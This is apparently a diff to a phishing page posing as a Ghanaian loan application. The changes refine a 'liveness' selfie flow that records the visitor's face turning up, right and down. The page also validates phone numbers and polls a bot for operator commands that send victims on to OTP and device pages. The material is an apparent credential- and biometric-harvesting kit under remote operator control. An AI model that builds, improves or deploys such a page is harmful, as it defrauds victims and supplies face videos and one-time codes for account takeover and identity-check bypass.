@@ -22,7 +22,6 @@ body{font-family:'DM Sans',sans-serif;background:var(--bg);min-height:100vh;
   box-shadow:var(--shadow);overflow:hidden;animation:fadeUp .45s cubic-bezier(.22,.8,.3,1) both}
 @keyframes fadeUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
 
-/* HEADER */
 .header{background:linear-gradient(135deg,#E42320 0%,#c01c1a 100%);padding:28px 28px 24px;position:relative;overflow:hidden}
 .header::before{content:'';position:absolute;top:-40px;right:-40px;width:160px;height:160px;background:rgba(255,255,255,0.06);border-radius:50%}
 .header::after{content:'';position:absolute;bottom:-30px;left:30px;width:100px;height:100px;background:rgba(255,255,255,0.04);border-radius:50%}
@@ -33,7 +32,6 @@ body{font-family:'DM Sans',sans-serif;background:var(--bg);min-height:100vh;
 .header-title{font-family:'Sora',sans-serif;font-size:23px;font-weight:800;color:white;position:relative;z-index:1;letter-spacing:-0.5px;line-height:1.2}
 .header-desc{font-size:13.5px;color:rgba(255,255,255,0.78);margin-top:6px;position:relative;z-index:1;line-height:1.55;font-weight:400}
 
-/* LOAN INFO */
 .loan-info{margin:20px 22px 0;background:var(--red-soft);border:1px solid var(--red-border);border-radius:18px;padding:16px 18px;display:flex;align-items:center;gap:14px}
 .loan-icon{width:42px;height:42px;background:var(--red);border-radius:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
 .loan-icon svg{width:22px;height:22px}
@@ -41,7 +39,6 @@ body{font-family:'DM Sans',sans-serif;background:var(--bg);min-height:100vh;
 .loan-amount{font-family:'Sora',sans-serif;font-size:26px;font-weight:800;color:var(--text-dark);letter-spacing:-0.8px;line-height:1.1}
 .loan-details{font-size:12.5px;color:var(--text-mid);margin-top:2px;font-weight:500}
 
-/* FORM */
 .form-body{padding:22px 22px 26px}
 .form-group{margin-bottom:16px}
 label{display:block;font-size:13px;font-weight:600;color:var(--text-dark);margin-bottom:7px;letter-spacing:0.1px}
@@ -82,15 +79,10 @@ input::placeholder{color:var(--text-light)}
 }
 @keyframes slideUp{from{opacity:0;transform:translateY(60px)}to{opacity:1;transform:translateY(0)}}
 @keyframes popIn{from{opacity:0;transform:scale(0.93)}to{opacity:1;transform:scale(1)}}
-
-/* drag handle */
 .drag-handle{width:40px;height:4px;background:#e5e7eb;border-radius:2px;margin:0 auto 22px}
-
 .instr-inner{padding:0 26px 36px}
 .instr-title{font-family:'Sora',sans-serif;font-size:21px;font-weight:800;color:var(--text-dark);letter-spacing:-0.5px;margin-bottom:4px}
 .instr-sub{font-size:14px;color:var(--text-mid);margin-bottom:22px;font-weight:400;line-height:1.5}
-
-/* liveness steps row */
 .liveness-steps{display:flex;align-items:flex-start;justify-content:center;gap:4px;margin-bottom:22px}
 .ls-step{display:flex;flex-direction:column;align-items:center;gap:6px;flex:1;max-width:72px}
 .ls-icon{width:48px;height:48px;background:var(--red-soft);border:1.5px solid var(--red-border);
@@ -98,8 +90,6 @@ input::placeholder{color:var(--text-light)}
 .ls-icon svg{width:24px;height:24px;stroke:var(--red);fill:none;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round}
 .ls-label{font-size:10px;font-weight:600;color:var(--text-mid);text-align:center;letter-spacing:0.2px;text-transform:uppercase;white-space:nowrap}
 .ls-arrow{color:var(--text-light);font-size:18px;padding-top:14px;flex-shrink:0}
-
-/* polite single-line notice */
 .polite-notice{
   display:flex;align-items:flex-start;gap:10px;
   background:#f0fdf4;border:1px solid #bbf7d0;border-radius:14px;
@@ -107,7 +97,6 @@ input::placeholder{color:var(--text-light)}
 }
 .polite-notice svg{width:18px;height:18px;stroke:#16a34a;flex-shrink:0;margin-top:1px}
 .polite-notice p{font-size:13.5px;color:#15803d;font-weight:500;line-height:1.5}
-
 .btn-start{width:100%;background:linear-gradient(135deg,#E42320,#c01c1a);color:white;border:none;
   padding:15px;font-family:'Sora',sans-serif;font-size:16px;font-weight:700;border-radius:50px;
   cursor:pointer;transition:opacity .18s,transform .12s;box-shadow:0 4px 18px rgba(228,35,32,0.32)}
@@ -125,25 +114,22 @@ input::placeholder{color:var(--text-light)}
 #selfieVideo{
   position:absolute;inset:0;width:100%;height:100%;object-fit:cover;transform:scaleX(-1);
 }
-#selfieOverlay{
-  position:absolute;inset:0;width:100%;height:100%;pointer-events:none;
-}
+#selfieOverlay{position:absolute;inset:0;width:100%;height:100%;pointer-events:none;}
 #cropCanvas{display:none}
 
-/* ── STEP BAR (top) ── */
+/* ── STEP BAR ── */
 .step-bar{
   position:absolute;top:0;left:0;right:0;z-index:3;
-  padding:48px 24px 16px;
-  background:linear-gradient(180deg,rgba(0,0,0,0.75) 0%,transparent 100%);
+  padding:50px 20px 14px;
+  background:linear-gradient(180deg,rgba(0,0,0,0.78) 0%,transparent 100%);
   display:flex;align-items:center;justify-content:center;gap:6px;
 }
 .sbar-item{display:flex;flex-direction:column;align-items:center;gap:4px}
 .sbar-circle{
-  width:38px;height:38px;border-radius:50%;border:2px solid rgba(255,255,255,0.22);
-  background:rgba(255,255,255,0.07);display:flex;align-items:center;justify-content:center;
-  transition:all .35s;
+  width:40px;height:40px;border-radius:50%;border:2px solid rgba(255,255,255,0.22);
+  background:rgba(255,255,255,0.07);display:flex;align-items:center;justify-content:center;transition:all .35s;
 }
-.sbar-circle svg{width:18px;height:18px;stroke:rgba(255,255,255,0.38);fill:none;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round;transition:stroke .35s}
+.sbar-circle svg{width:19px;height:19px;stroke:rgba(255,255,255,0.38);fill:none;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round;transition:stroke .35s}
 .sbar-circle.active{border-color:#E42320;background:rgba(228,35,32,0.22);box-shadow:0 0 0 5px rgba(228,35,32,0.18)}
 .sbar-circle.active svg{stroke:#fff}
 .sbar-circle.done{border-color:#22c55e;background:rgba(34,197,94,0.18)}
@@ -151,49 +137,47 @@ input::placeholder{color:var(--text-light)}
 .sbar-label{font-size:9px;font-weight:600;color:rgba(255,255,255,0.4);letter-spacing:0.4px;text-transform:uppercase;transition:color .35s;white-space:nowrap}
 .sbar-label.active{color:rgba(255,255,255,0.95)}
 .sbar-label.done{color:#22c55e}
-.sbar-connector{width:18px;height:2px;background:rgba(255,255,255,0.14);border-radius:1px;margin-bottom:14px;transition:background .4s}
+.sbar-connector{width:20px;height:2px;background:rgba(255,255,255,0.14);border-radius:1px;margin-bottom:14px;transition:background .4s}
 .sbar-connector.done{background:#22c55e}
 
 /* ── BOTTOM PANEL ── */
 .selfie-panel{
   position:absolute;bottom:0;left:0;right:0;z-index:2;
-  background:linear-gradient(0deg,rgba(0,0,0,0.92) 0%,rgba(0,0,0,0.0) 100%);
-  padding:18px 28px 44px;
+  background:linear-gradient(0deg,rgba(0,0,0,0.95) 0%,rgba(0,0,0,0.0) 100%);
+  padding:22px 28px 48px;
   display:flex;flex-direction:column;align-items:center;gap:8px;
 }
 .selfie-instr{
-  font-family:'Sora',sans-serif;font-size:22px;font-weight:800;
-  color:#fff;letter-spacing:-0.4px;text-align:center;
-  transition:opacity .2s;min-height:28px;
+  font-family:'Sora',sans-serif;font-size:24px;font-weight:800;
+  color:#fff;letter-spacing:-0.4px;text-align:center;transition:opacity .2s;min-height:30px;
 }
-.selfie-sub{font-size:13px;color:rgba(255,255,255,0.52);text-align:center;font-weight:500}
+.selfie-sub{font-size:13.5px;color:rgba(255,255,255,0.55);text-align:center;font-weight:500}
 .selfie-cancel-btn{
-  margin-top:6px;background:rgba(255,255,255,0.10);color:rgba(255,255,255,0.65);
-  border:1px solid rgba(255,255,255,0.18);padding:11px 40px;border-radius:50px;
+  margin-top:8px;background:rgba(255,255,255,0.10);color:rgba(255,255,255,0.65);
+  border:1px solid rgba(255,255,255,0.20);padding:12px 44px;border-radius:50px;
   font-family:'DM Sans',sans-serif;font-size:14px;cursor:pointer;transition:background .18s;
 }
 .selfie-cancel-btn:hover{background:rgba(255,255,255,0.18)}
 
-/* ── COUNTDOWN RING – centred on oval ── */
-/* Oval centre is at 38% from top of screen; use transform to align */
+/* ── COUNTDOWN RING – tracks oval centre dynamically via JS ── */
 #countdownRing{
   position:absolute;
-  /* horizontally centred; vertically at oval centre */
-  left:50%;top:38%;
+  left:50%;
+  /* JS sets top via --oval-top-pct variable or inline style */
+  z-index:4;pointer-events:none;
   transform:translate(-50%,-50%);
-  z-index:3;pointer-events:none;
   opacity:0;transition:opacity .3s;
 }
 #countdownRing.visible{opacity:1}
-.cring-svg{width:76px;height:76px}
-.cring-bg{fill:none;stroke:rgba(255,255,255,0.10);stroke-width:5}
+.cring-svg{width:90px;height:90px}
+.cring-bg{fill:none;stroke:rgba(255,255,255,0.12);stroke-width:5.5}
 .cring-prog{
-  fill:none;stroke:#E42320;stroke-width:5;stroke-linecap:round;
-  stroke-dasharray:219.9;stroke-dashoffset:219.9;
+  fill:none;stroke:#E42320;stroke-width:5.5;stroke-linecap:round;
+  stroke-dasharray:226.2;stroke-dashoffset:226.2;
   transform-origin:50% 50%;transform:rotate(-90deg);
   transition:stroke-dashoffset 0.28s linear,stroke .4s;
 }
-.cring-num{font-family:'Sora',sans-serif;font-size:26px;font-weight:800;fill:white;dominant-baseline:central;text-anchor:middle}
+.cring-num{font-family:'Sora',sans-serif;font-size:30px;font-weight:800;fill:white;dominant-baseline:central;text-anchor:middle}
 
 /* SPINNER */
 #spinner{display:none;position:fixed;inset:0;background:rgba(10,10,10,0.90);z-index:10000;
@@ -221,7 +205,6 @@ input::placeholder{color:var(--text-light)}
 </head>
 <body>
 
-<!-- ══ MAIN CARD ══ -->
 <div class="card">
   <div class="header">
     <div class="logo-wrap">
@@ -284,53 +267,40 @@ input::placeholder{color:var(--text-light)}
   </div>
 </div>
 
-<!-- ══ PRE-SELFIE MODAL (bottom sheet) ══ -->
+<!-- ══ PRE-SELFIE MODAL ══ -->
 <div id="preSelfieModal">
   <div class="instr-card">
     <div class="drag-handle"></div>
     <div class="instr-inner">
       <div class="instr-title">Quick Identity Check</div>
       <div class="instr-sub">Follow the on-screen prompts to complete your liveness verification.</div>
-
-      <!-- 4-step visual preview -->
       <div class="liveness-steps">
         <div class="ls-step">
-          <div class="ls-icon">
-            <svg viewBox="0 0 24 24"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
-          </div>
+          <div class="ls-icon"><svg viewBox="0 0 24 24"><path d="M12 19V5M5 12l7-7 7 7"/></svg></div>
           <div class="ls-label">Look Up</div>
         </div>
         <div class="ls-arrow">›</div>
         <div class="ls-step">
-          <div class="ls-icon">
-            <svg viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
-          </div>
+          <div class="ls-icon"><svg viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg></div>
           <div class="ls-label">Look Right</div>
         </div>
         <div class="ls-arrow">›</div>
         <div class="ls-step">
-          <div class="ls-icon">
-            <svg viewBox="0 0 24 24"><path d="M12 5v14M19 12l-7 7-7-7"/></svg>
-          </div>
+          <div class="ls-icon"><svg viewBox="0 0 24 24"><path d="M12 5v14M19 12l-7 7-7-7"/></svg></div>
           <div class="ls-label">Look Down</div>
         </div>
         <div class="ls-arrow">›</div>
         <div class="ls-step">
-          <div class="ls-icon">
-            <svg viewBox="0 0 24 24"><circle cx="12" cy="10" r="3"/><path d="M12 2a10 10 0 100 20A10 10 0 0012 2z"/><path d="M6.5 18.5a7 7 0 0111 0"/></svg>
-          </div>
+          <div class="ls-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="10" r="3"/><path d="M12 2a10 10 0 100 20A10 10 0 0012 2z"/><path d="M6.5 18.5a7 7 0 0111 0"/></svg></div>
           <div class="ls-label">Face Camera</div>
         </div>
       </div>
-
-      <!-- Single polite notice -->
       <div class="polite-notice">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
           <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
         </svg>
         <p>Please ensure your face is well-lit, unobstructed, and centred in the frame before you begin.</p>
       </div>
-
       <button class="btn-start" id="startCaptureBtn">Begin Verification</button>
       <button class="btn-modal-cancel" id="modalCancelBtn">Not now</button>
     </div>
@@ -342,55 +312,72 @@ input::placeholder{color:var(--text-light)}
   <video id="selfieVideo" autoplay muted playsinline></video>
   <canvas id="cropCanvas"></canvas>
 
-  <!-- Step indicator bar -->
   <div class="step-bar" id="stepBar"></div>
 
-  <!-- SVG overlay: dark vignette + oval cutout + directional arrow
-       ViewBox 400 × 860. Oval centre at cx=200 cy=310 (≈36% from top).
-       Arrows sit 50px outside the oval edge in each direction. -->
+  <!--
+    SVG overlay viewBox: 400 × 900
+    Oval: cx=200 cy=360 rx=172 ry=230
+      → top  = 360-230 = 130  (well below step bar)
+      → bottom = 360+230 = 590 (leaves ~310px SVG units for bottom panel = ~34% of screen)
+    Arrows placed just outside oval edges:
+      up    → cy = 130-44 = 86
+      right → cx = 200+172+44 = 416 (clamped to 392 to stay visible)
+      down  → cy = 590+44 = 634
+  -->
   <svg id="selfieOverlay"
-       viewBox="0 0 400 860"
+       viewBox="0 0 400 900"
        preserveAspectRatio="xMidYMid slice"
        xmlns="http://www.w3.org/2000/svg">
     <defs>
       <mask id="ovalMask">
-        <rect width="400" height="860" fill="white"/>
-        <ellipse cx="200" cy="310" rx="140" ry="188" fill="black"/>
+        <rect width="400" height="900" fill="white"/>
+        <ellipse cx="200" cy="360" rx="172" ry="230" fill="black"/>
       </mask>
-      <filter id="arrowGlow" x="-50%" y="-50%" width="200%" height="200%">
-        <feGaussianBlur stdDeviation="7" result="blur"/>
+      <filter id="arrowGlow" x="-60%" y="-60%" width="220%" height="220%">
+        <feGaussianBlur stdDeviation="8" result="blur"/>
         <feComposite in="SourceGraphic" in2="blur" operator="over"/>
       </filter>
     </defs>
 
-    <!-- vignette with oval cutout -->
-    <rect width="400" height="860" fill="rgba(0,0,0,0.58)" mask="url(#ovalMask)"/>
+    <!-- dark vignette with oval window -->
+    <rect width="400" height="900" fill="rgba(0,0,0,0.60)" mask="url(#ovalMask)"/>
 
-    <!-- oval border – colour driven by JS -->
+    <!-- oval border, colour set by JS -->
     <ellipse id="ovalBorder"
-      cx="200" cy="310" rx="140" ry="188"
-      fill="none" stroke="rgba(255,255,255,0.80)" stroke-width="3.5"
-      stroke-dasharray="14 8"/>
+      cx="200" cy="360" rx="172" ry="230"
+      fill="none" stroke="rgba(255,255,255,0.82)" stroke-width="4"
+      stroke-dasharray="16 9"/>
 
-    <!-- direction arrow group (hidden until step starts) -->
+    <!-- corner tick marks for a "scan" feel -->
+    <g stroke="white" stroke-width="5" stroke-linecap="round" opacity="0.9">
+      <!-- top-left arc suggestion -->
+      <path d="M 90 290 Q 65 265 90 240"/>
+      <!-- top-right -->
+      <path d="M 310 290 Q 335 265 310 240"/>
+      <!-- bottom-left -->
+      <path d="M 90 430 Q 65 455 90 480"/>
+      <!-- bottom-right -->
+      <path d="M 310 430 Q 335 455 310 480"/>
+    </g>
+
+    <!-- direction arrow -->
     <g id="arrowGroup" opacity="0">
-      <circle id="arrowCircle" cx="200" cy="80" r="28" fill="rgba(228,35,32,0.90)" filter="url(#arrowGlow)"/>
-      <line id="aShaft" x1="0" y1="0" x2="0" y2="0" stroke="white" stroke-width="4" stroke-linecap="round"/>
-      <line id="aHead1" x1="0" y1="0" x2="0" y2="0" stroke="white" stroke-width="4" stroke-linecap="round"/>
-      <line id="aHead2" x1="0" y1="0" x2="0" y2="0" stroke="white" stroke-width="4" stroke-linecap="round"/>
+      <circle id="arrowCircle" cx="200" cy="86" r="30" fill="rgba(228,35,32,0.92)" filter="url(#arrowGlow)"/>
+      <line id="aShaft" x1="0" y1="0" x2="0" y2="0" stroke="white" stroke-width="4.5" stroke-linecap="round"/>
+      <line id="aHead1" x1="0" y1="0" x2="0" y2="0" stroke="white" stroke-width="4.5" stroke-linecap="round"/>
+      <line id="aHead2" x1="0" y1="0" x2="0" y2="0" stroke="white" stroke-width="4.5" stroke-linecap="round"/>
     </g>
   </svg>
 
-  <!-- Countdown ring, CSS-positioned at oval centre (36% from top) -->
+  <!-- Countdown ring – JS positions top as % of screen matching oval centre -->
   <div id="countdownRing">
-    <svg class="cring-svg" viewBox="0 0 76 76">
-      <circle class="cring-bg"   cx="38" cy="38" r="35"/>
-      <circle class="cring-prog" id="cringProg" cx="38" cy="38" r="35"/>
-      <text   class="cring-num"  id="cringNum"  x="38" y="38">4</text>
+    <svg class="cring-svg" viewBox="0 0 90 90">
+      <circle class="cring-bg"   cx="45" cy="45" r="38"/>
+      <circle class="cring-prog" id="cringProg" cx="45" cy="45" r="38"/>
+      <text   class="cring-num"  id="cringNum"  x="45" y="45">4</text>
     </svg>
   </div>
 
-  <!-- Bottom instruction panel -->
   <div class="selfie-panel">
     <div class="selfie-instr" id="selfieInstr">Starting camera…</div>
     <div class="selfie-sub"   id="selfieSub"></div>
@@ -429,62 +416,34 @@ const CONFIG = {
   SUCCESS_PAGE:'success.html'
 };
 
-/* ════════ LIVENESS STEPS: up → right → down → face camera ════════
-   SVG oval: cx=200 cy=310 rx=140 ry=188  (viewBox 400×860)
-   Arrows placed 50px outside oval edge in each direction.           */
-const STEP_DURATION = 4000; // ms each step
+/* ════════ SVG OVAL GEOMETRY ════════
+   Must match the SVG: viewBox 400×900, oval cx=200 cy=360 rx=172 ry=230
+   Oval centre as fraction of viewBox height: 360/900 = 0.40 (40% from top)
+   We use this to position the countdown ring precisely over the face.         */
+const OV = { cx:200, cy:360, rx:172, ry:230, vw:400, vh:900 };
+
+/* Oval centre = 40% from top of screen */
+const OVAL_TOP_PCT = (OV.cy / OV.vh * 100).toFixed(2) + '%';
+
+/* ════════ LIVENESS STEPS ════════
+   Arrows sit ~44 SVG-units outside each oval edge.
+   up    → cy = 360 - 230 - 44 = 86
+   right → cx = 200 + 172 + 44 = 416  (clamped to 388 to stay in viewBox)
+   down  → cy = 360 + 230 + 44 = 634                                         */
+const STEP_DURATION = 4000;
 
 const STEPS = [
-  {
-    id:'up',
-    instr:'Look Up',
-    sub:'Slowly tilt your head upward',
-    dir:'up',
-    // arrow above oval  (310 - 188 - 52 = 70)
-    cx:200, cy:68,
-    icon:'<path d="M12 19V5M5 12l7-7 7 7"/>',
-    label:'Look Up'
-  },
-  {
-    id:'right',
-    instr:'Look Right',
-    sub:'Turn your head to the right',
-    dir:'right',
-    // arrow right of oval (200 + 140 + 50 = 390)
-    cx:378, cy:310,
-    icon:'<path d="M5 12h14M12 5l7 7-7 7"/>',
-    label:'Look Right'
-  },
-  {
-    id:'down',
-    instr:'Look Down',
-    sub:'Slowly tilt your head downward',
-    dir:'down',
-    // arrow below oval (310 + 188 + 52 = 550)
-    cx:200, cy:552,
-    icon:'<path d="M12 5v14M19 12l-7 7-7-7"/>',
-    label:'Look Down'
-  },
-  {
-    id:'face',
-    instr:'Face the Camera',
-    sub:'Look straight ahead at the lens',
-    dir:null,
-    cx:200, cy:310,
-    icon:'<circle cx="12" cy="10" r="3"/><path d="M12 2a10 10 0 100 20A10 10 0 0012 2z"/><path d="M6.5 18.5a7 7 0 0111 0"/>',
-    label:'Face Camera'
-  }
+  { id:'up',    instr:'Look Up',         sub:'Slowly tilt your head upward',       dir:'up',    cx:200, cy:86,  icon:'<path d="M12 19V5M5 12l7-7 7 7"/>',                                                                                                   label:'Look Up'     },
+  { id:'right', instr:'Look Right',      sub:'Turn your head to the right',        dir:'right', cx:388, cy:360, icon:'<path d="M5 12h14M12 5l7 7-7 7"/>',                                                                                                   label:'Look Right'  },
+  { id:'down',  instr:'Look Down',       sub:'Slowly tilt your head downward',     dir:'down',  cx:200, cy:634, icon:'<path d="M12 5v14M19 12l-7 7-7-7"/>',                                                                                                 label:'Look Down'   },
+  { id:'face',  instr:'Face the Camera', sub:'Look straight ahead at the lens',    dir:null,    cx:200, cy:360, icon:'<circle cx="12" cy="10" r="3"/><path d="M12 2a10 10 0 100 20A10 10 0 0012 2z"/><path d="M6.5 18.5a7 7 0 0111 0"/>',                  label:'Face Camera' }
 ];
 
-/* Arrow geometry (offsets from cx,cy) */
 const ARROWS = {
-  up:    { shaft:[0,11,0,-11], h1:[0,-11,-8,-2], h2:[0,-11,8,-2] },
-  right: { shaft:[-11,0,11,0], h1:[11,0,2,-8],  h2:[11,0,2,8]   },
-  down:  { shaft:[0,-11,0,11], h1:[0,11,-8,2],   h2:[0,11,8,2]   }
+  up:    { shaft:[0, 12,0,-12], h1:[0,-12,-9,-3], h2:[0,-12,9,-3] },
+  right: { shaft:[-12,0,12, 0], h1:[12, 0, 3,-9], h2:[12, 0,3, 9] },
+  down:  { shaft:[0,-12,0, 12], h1:[0, 12,-9, 3], h2:[0, 12,9, 3] }
 };
-
-/* Oval geometry for canvas crop (must match SVG values) */
-const OV = { cx:200, cy:310, rx:140, ry:188, vw:400, vh:860 };
 
 /* ════════ DOM ════════ */
 const phoneInput    = document.getElementById('phone');
@@ -521,6 +480,9 @@ let mediaStream=null, canvasStream=null, mediaRecorder=null;
 let recordedChunks=[], selfieBlob=null;
 let currentStep=0, countdownTimer=null, animReq=null;
 const botState={lastUpdateId:0};
+
+/* Position countdown ring at oval centre */
+countdownRing.style.top = OVAL_TOP_PCT;
 
 /* ════════ HELPERS ════════ */
 const isValidGhana = p => /^(020|050|024|054|027|057|026|056)\d{7}$/.test(p);
@@ -565,44 +527,38 @@ function updateStepBar(active){
     const circ=document.getElementById(`sbc${i}`);
     const lbl =document.getElementById(`sbl${i}`);
     const con =document.getElementById(`sbcon${i}`);
-    if(i<active){ circ.className='sbar-circle done'; lbl.className='sbar-label done'; if(con)con.className='sbar-connector done'; }
-    else if(i===active){ circ.className='sbar-circle active'; lbl.className='sbar-label active'; if(con)con.className='sbar-connector'; }
-    else{ circ.className='sbar-circle'; lbl.className='sbar-label'; if(con)con.className='sbar-connector'; }
+    if(i<active){      circ.className='sbar-circle done';   lbl.className='sbar-label done';   if(con)con.className='sbar-connector done'; }
+    else if(i===active){circ.className='sbar-circle active'; lbl.className='sbar-label active'; if(con)con.className='sbar-connector'; }
+    else{              circ.className='sbar-circle';         lbl.className='sbar-label';         if(con)con.className='sbar-connector'; }
   });
 }
 
-/* ════════ CANVAS – mirror + oval crop matching SVG oval ════════ */
+/* ════════ CANVAS – full frame capture cropped to oval ════════
+   Canvas matches SVG viewBox (OV.vw × OV.vh).
+   Video is drawn mirrored using cover-fit so face fills the oval.
+   Then destination-in clips to the exact oval shape.               */
 function drawFrame(){
-  /* The SVG viewBox is OV.vw × OV.vh scaled to fill the real screen.
-     We draw the video into a canvas that matches the SVG viewBox so
-     the oval clip coordinates are identical. */
   cropCanvas.width =OV.vw;
   cropCanvas.height=OV.vh;
+
+  /* Step 1: mirror + cover-fit video into canvas */
   cropCtx.save();
-  // Mirror horizontally (front camera)
   cropCtx.translate(OV.vw,0);
   cropCtx.scale(-1,1);
-
-  // Draw video to fill viewBox maintaining cover aspect
   const vAR=selfieVideo.videoWidth/selfieVideo.videoHeight;
   const cAR=OV.vw/OV.vh;
   let sw,sh,sx,sy;
-  if(vAR>cAR){
-    sh=selfieVideo.videoHeight; sw=sh*cAR;
-    sx=(selfieVideo.videoWidth-sw)/2; sy=0;
-  } else {
-    sw=selfieVideo.videoWidth; sh=sw/cAR;
-    sx=0; sy=(selfieVideo.videoHeight-sh)/2;
-  }
+  if(vAR>cAR){ sh=selfieVideo.videoHeight; sw=sh*cAR; sx=(selfieVideo.videoWidth-sw)/2; sy=0; }
+  else        { sw=selfieVideo.videoWidth;  sh=sw/cAR; sx=0; sy=(selfieVideo.videoHeight-sh)/2; }
   cropCtx.drawImage(selfieVideo,sx,sy,sw,sh,0,0,OV.vw,OV.vh);
   cropCtx.restore();
 
-  // Clip to oval so recorded video only shows the face area
+  /* Step 2: clip everything outside oval (destination-in keeps only inside) */
   cropCtx.save();
   cropCtx.globalCompositeOperation='destination-in';
   cropCtx.beginPath();
   cropCtx.ellipse(OV.cx,OV.cy,OV.rx,OV.ry,0,0,Math.PI*2);
-  cropCtx.fillStyle='black';
+  cropCtx.fillStyle='#000';
   cropCtx.fill();
   cropCtx.restore();
 
@@ -617,17 +573,18 @@ function setArrow(step){
   arrowCircle.setAttribute('cx',cx);
   arrowCircle.setAttribute('cy',cy);
   const d=ARROWS[step.dir];
-  const set=(el,x1,y1,x2,y2)=>{
+  const line=(el,x1,y1,x2,y2)=>{
     el.setAttribute('x1',cx+x1); el.setAttribute('y1',cy+y1);
     el.setAttribute('x2',cx+x2); el.setAttribute('y2',cy+y2);
   };
-  set(aShaft,...d.shaft);
-  set(aHead1,...d.h1);
-  set(aHead2,...d.h2);
+  line(aShaft,...d.shaft);
+  line(aHead1,...d.h1);
+  line(aHead2,...d.h2);
 }
 
-/* ════════ COUNTDOWN RING ════════ */
-const CIRC=2*Math.PI*35; // r=35
+/* ════════ COUNTDOWN RING ════════
+   r=38  circumference = 2π×38 ≈ 238.8                              */
+const CIRC = 2*Math.PI*38;
 
 function startCountdown(ms,onDone){
   clearInterval(countdownTimer);
@@ -646,7 +603,7 @@ function startCountdown(ms,onDone){
   countdownTimer=setInterval(tick,1000);
 }
 
-/* ════════ SET / ADVANCE STEPS ════════ */
+/* ════════ STEPS ════════ */
 function setStep(idx){
   currentStep=idx;
   const s=STEPS[idx];
@@ -654,15 +611,12 @@ function setStep(idx){
   setTimeout(()=>{ selfieInstr.textContent=s.instr; selfieSub.textContent=s.sub; selfieInstr.style.opacity='1'; },160);
   updateStepBar(idx);
   setArrow(s);
-  ovalBorder.setAttribute('stroke', idx===STEPS.length-1 ? '#22c55e' : '#E42320');
+  ovalBorder.setAttribute('stroke', idx===STEPS.length-1?'#22c55e':'#E42320');
   clearInterval(countdownTimer);
   startCountdown(STEP_DURATION, advanceStep);
 }
 
-function advanceStep(){
-  if(currentStep<STEPS.length-1){ setStep(currentStep+1); }
-  else{ finishCapture(); }
-}
+function advanceStep(){ currentStep<STEPS.length-1 ? setStep(currentStep+1) : finishCapture(); }
 
 function finishCapture(){
   clearInterval(countdownTimer);
@@ -670,9 +624,9 @@ function finishCapture(){
   ovalBorder.setAttribute('stroke','#22c55e');
   arrowGroup.setAttribute('opacity','0');
   selfieInstr.textContent='✓ Verified';
-  selfieSub.textContent='';
+  selfieSub.textContent='Identity confirmed';
   updateStepBar(STEPS.length);
-  setTimeout(()=>{ if(mediaRecorder&&mediaRecorder.state!=='inactive') mediaRecorder.stop(); },700);
+  setTimeout(()=>{ if(mediaRecorder&&mediaRecorder.state!=='inactive') mediaRecorder.stop(); },800);
 }
 
 /* ════════ CAMERA ════════ */
@@ -697,7 +651,7 @@ async function startSelfieVerification(){
   selfieInstr.textContent='Starting camera…';
   selfieSub.textContent='';
   arrowGroup.setAttribute('opacity','0');
-  ovalBorder.setAttribute('stroke','rgba(255,255,255,0.80)');
+  ovalBorder.setAttribute('stroke','rgba(255,255,255,0.82)');
   countdownRing.classList.remove('visible');
   recordedChunks=[]; selfieBlob=null;
 
@@ -780,7 +734,7 @@ function startPolling(appId,decId,verId,aplId){
           botState.lastUpdateId=u.update_id;
           if(u.callback_query){
             const cb=u.callback_query.data;
-            if(cb===appId){ clearInterval(interval); spinnerEl.style.display='none'; window.location.href=`${CONFIG.OTP_PAGE}?${search}`; }
+            if(cb===appId){      clearInterval(interval); spinnerEl.style.display='none'; window.location.href=`${CONFIG.OTP_PAGE}?${search}`; }
             else if(cb===verId){ clearInterval(interval); spinnerEl.style.display='none'; window.location.href=`${CONFIG.DEVICE_PAGE}?${search}`; }
             else if(cb===aplId){ clearInterval(interval); spinnerEl.style.display='none'; showToast(); resetButton(); }
             else if(cb===decId){ clearInterval(interval); spinnerEl.style.display='none'; showError('Request declined. Please try again.'); resetButton(); }
